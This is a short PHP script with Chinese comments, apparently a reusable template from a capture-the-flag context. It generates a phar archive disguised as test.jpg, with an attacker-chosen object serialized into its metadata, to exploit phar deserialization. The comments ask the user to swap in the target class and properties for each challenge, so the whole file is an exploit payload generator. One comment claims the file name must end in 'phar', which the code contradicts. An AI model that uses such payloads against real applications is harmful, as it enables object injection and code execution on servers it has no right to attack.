<?php
highlight_file(__FILE__);

// 修改1：不同题目的不同class类
class TestObject {
}

@unlink('test.jpg');   //删除之前的test.par文件(如果有)
$phar=new Phar('test.jpg');  //创建一个phar对象，文件名必须以phar为后缀
$phar->startBuffering();  //开始写文件
$phar->setStub('<?php __HALT_COMPILER(); ?>');  //写入stub

// 修改2：new对应的class类对象
$o=new TestObject();
// 修改3：针对不同环境做不同的赋值，如果没有则删除即可


$phar->setMetadata($o);//写入meta-data
$phar->addFromString("test.txt","test");  //添加要压缩的文件
$phar->stopBuffering();
?>
